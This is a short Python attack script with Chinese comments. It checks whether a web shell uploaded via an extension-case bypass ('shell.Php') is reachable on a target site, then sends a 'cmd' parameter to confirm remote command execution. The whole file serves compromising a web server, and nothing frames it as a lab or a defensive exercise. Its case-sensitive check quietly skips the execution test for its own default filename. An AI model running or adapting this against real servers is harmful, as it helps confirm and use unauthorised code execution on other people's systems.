#!/usr/bin/env python3
import requests
import sys

def test_bypass_file(url, filename="shell.Php"):
    """测试绕过文件是否可访问"""
    print(f"[*] 测试绕过文件: {filename}")

    test_url = f"{url}/{filename}"

    try:
        response = requests.get(test_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] 文件可访问: {test_url}")
            # 尝试执行PHP代码
            if filename.endswith('.php') or 'php' in filename:
                exec_response = requests.get(test_url, params={"cmd": "echo test"})
                if 'test' in exec_response.text:
                    print(f"[+] PHP代码可执行!")
                    return True
            return True
        else:
            print(f"[-] 文件不可访问，状态码: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python verify_bypass.py <目标URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    test_bypass_file(target_url)
